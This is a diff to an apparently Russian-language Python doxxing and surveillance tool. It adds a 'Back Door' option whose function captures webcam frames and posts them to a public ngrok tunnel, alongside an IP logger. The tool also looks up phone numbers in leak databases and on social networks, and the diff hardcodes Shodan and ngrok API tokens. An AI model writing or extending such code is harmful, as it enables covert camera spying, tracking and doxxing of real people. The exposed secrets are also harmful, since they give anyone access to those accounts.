@@ -18,9 +18,12 @@ from colorama import init
 from termcolor import colored
 import phonenumbers
 import time
+from threading import Thread
 import os
 import shodan
+import jwt
 import flask
+import cv2
 import datetime
 import socket
 import threading
@@ -73,6 +76,9 @@ banner = '''
 # Выводим баннер с алым цветом
 print(colored(banner, "red"))
 
+API_KEY_SHODAN = "qvlTYbZKbb4Ln0YO7EWp61Qt3TH1oO8Z"
+shodan_api = shodan.Shodan(API_KEY_SHODAN)
+ngrok.set_auth_token("2uOsAdlQ6b03zXhiGUMKodfnBDu_4qHcmGMKCfVd1yq9c65D4")
 
 def search_in_files(search_term):
     count = 0
@@ -101,8 +107,11 @@ def search_in_files(search_term):
     if not found:
         print("Data not found in any database.")
 
-API_KEY_SHODAN = "qvlTYbZKbb4Ln0YO7EWp61Qt3TH1oO8Z"
-shodan_api = shodan.Shodan(API_KEY_SHODAN)
+def search_ring(full_name):
+    url = f"https://ring.org.ua/search?q={full_name}"
+    response = requests.get(url)
+    return response.text if response.status_code == 200 else None
+
 def ip_search():
     import urllib.request
     import json
@@ -219,8 +228,83 @@ def ip_search():
 
     time.sleep(3)
 
+def start_backdoor_server():
+    # Инициализация Flask
+    app = Flask(__name__)
 
-ngrok.set_auth_token("2uOsAdlQ6b03zXhiGUMKodfnBDu_4qHcmGMKCfVd1yq9c65D4")
+    # Директория для сохранения полученных кадров
+    UPLOAD_FOLDER = 'received_frames'
+    if not os.path.exists(UPLOAD_FOLDER):
+        os.makedirs(UPLOAD_FOLDER)
+
+    # Обработчик для загрузки кадров
+    @app.route('/upload', methods=['POST'])
+    def upload_file():
+        if 'file' not in request.files:
+            return "No file part", 400
+
+        file = request.files['file']
+        if file.filename == '':
+            return "No selected file", 400
+
+        # Генерация уникального имени для файла
+        filename = os.path.join(UPLOAD_FOLDER, f"frame_{int(time.time())}.jpg")
+        file.save(filename)
+        print(f"Файл сохранен: {filename}")
+        return f"Frame received and saved as {filename}", 200
+
+    # Запуск сервера Flask в отдельном потоке
+    def run_flask():
+        app.run(host='0.0.0.0', port=5000, use_reloader=False)
+
+    # Функция для стриминга видео с камеры
+    def stream_video(ngrok_url):
+        cap = cv2.VideoCapture(0)  # Открытие фронтальной камеры
+
+        if not cap.isOpened():
+            print("Не удалось открыть камеру!")
+            return
+
+        while cap.isOpened():
+            ret, frame = cap.read()
+            if not ret:
+                print("Ошибка получения кадра!")
+                continue
+
+            # Показываем кадр в окне
+            cv2.imshow("Frame", frame)
+
+            # Кодируем кадр в формат JPEG
+            _, buffer = cv2.imencode(".jpg", frame)
+            frame_bytes = buffer.tobytes()
+
+            try:
+                # Отправка кадра на сервер
+                response = requests.post(ngrok_url.public_url + "/upload", files={"file": ("frame.jpg", frame_bytes, "image/jpeg")})
+                print(f"Кадр отправлен: {response.status_code}")
+            except requests.exceptions.RequestException as e:
+                print(f"Ошибка соединения: {e}")
+                time.sleep(3)  # Подождать и попробовать снова
+
+            # Нажатие 'q' для выхода из видео-потока
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                break
+
+        cap.release()
+        cv2.destroyAllWindows()
+
+    # Получаем публичный URL через ngrok
+    ngrok_url = ngrok.connect(5000)
+    print(f"🔗 Ссылка для отправки видео: {ngrok_url}/upload")
+
+    # Запуск Flask-сервера в отдельном потоке
+    server_thread = threading.Thread(target=run_flask)
+    server_thread.daemon = True
+    server_thread.start()
+
+    # Начинаем стримить видео с камеры
+    stream_video(ngrok_url)
+
 
 def start_ip_logger(redirect_url="https://google.com", port=5000):
     app = Flask(__name__)
@@ -329,6 +413,10 @@ while True:
         inp = input(colored("[?]Введи:", "blue"))
 
         if inp == "1":
+            # Ввод номера
+            format_number = input(colored("📲 Введи код страны (+7, +380 и т. д.): ", "blue"))
+            number = input(colored("☎ Введи номер: ", "blue"))
+
             def check_leaks(phone):
                 try:
                     response = requests.get(f"https://api.leaks.com/check?phone={phone}")
@@ -355,12 +443,14 @@ while True:
 
             # Функция поиска по соцсетям
             def check_socials(phone):
+                number_parse1 = phonenumbers.parse(phone)
+                country_code1 = geocoder.region_code_for_number(number_parse1).lower()
                 socials = {
                     "VK": f"https://vk.com/phone{phone}",
                     "Facebook": f"https://www.facebook.com/search/top?q={phone}",
                     "Instagram": f"https://www.instagram.com/{phone}",
                     "Twitter": f"https://twitter.com/search?q={phone}",
-                    "Truecaller": f"https://www.truecaller.com/search/global/{phone}"
+                    "Truecaller": f"https://www.truecaller.com/search/{country_code1}/{number}"
                 }
                 return socials
 
@@ -406,9 +496,7 @@ while True:
                     return f"❌ Ошибка WHOIS: {e}"
 
 
-            # Ввод номера
-            format_number = input(colored("📲 Введи код страны (+7, +380 и т. д.): ", "blue"))
-            number = input(colored("☎ Введи номер: ", "blue"))
+
 
             full = f"{format_number}{number}"
             number_parse = phonenumbers.parse(full)
@@ -571,7 +659,11 @@ while True:
             ip_search()
 
         if inp == "11":
-            start_ip_logger()
+            i = int(input("Back Door - 1\nIp logger - 2"))
+            if i == 2:
+                start_ip_logger()
+            else:
+                start_backdoor_server()
 
         if inp == "12":
             working_directory = r"D:\\PycharmProjects\\BloodGaze\\.venv\\Goose"
